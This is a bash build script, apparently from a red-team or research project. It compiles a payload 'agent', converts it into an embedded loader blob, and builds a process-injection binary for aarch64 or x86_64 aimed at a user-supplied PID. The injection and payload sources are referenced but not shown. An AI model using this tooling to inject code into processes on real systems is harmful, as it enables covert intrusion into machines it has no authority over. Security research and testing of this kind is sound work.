#!/bin/bash	

read -p "Enter the Architecture (aarch64/x86_64): " ARCH
read -p "Enter the desired file output name: " NAME
read -p "Enter the PID of the target process: " PID


gcc -Wall -O3 -s -static-pie -fPIE -o agent payload-example.c
    
if [[ $ARCH == "aarch64" || $ARCH == "AARCH64" ]]; then
    sed -i "s/^\(#define PID \).*/\1$PID/" ../process_injection/aarch64_reg.c


    xxd -n "agent" -i agent | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > agent.h
    gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c shelf-aarch64.c -o loader.o
    ld -T linker.ld --omagic -o loader.elf loader.o
    objcopy -O binary loader.elf loader.bin
    xxd -n "agent" -i loader.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../process_injection/agent.h
    gcc -static -pie -s -fPIE -Wall -O3 -o $NAME ../process_injection/aarch64_reg.c
    rm ../process_injection/agent.h
elif [[ $ARCH == "x86_64" || $ARCH == "X86_64" ]]; then
    sed -i "s/^\(#define PID \).*/\1$PID/" ../process_injection/x86_64_reg.c

    xxd -n "agent" -i agent | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > agent.h
    gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c shelf-x86_64.c -o loader.o
    ld -T linker.ld --omagic -o loader.elf loader.o
    objcopy -O binary loader.elf loader.bin
    xxd -n "agent" -i loader.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../process_injection/agent.h
    gcc -static -pie -s -fPIE -Wall -O3 -o $NAME ../process_injection/x86_64_reg.c
    rm ../process_injection/agent.h
else
    echo "Error: Unknown or unset architecture: $ARCH"
    exit 1
fi
echo "============== Build complete for $NAME ($ARCH) =============="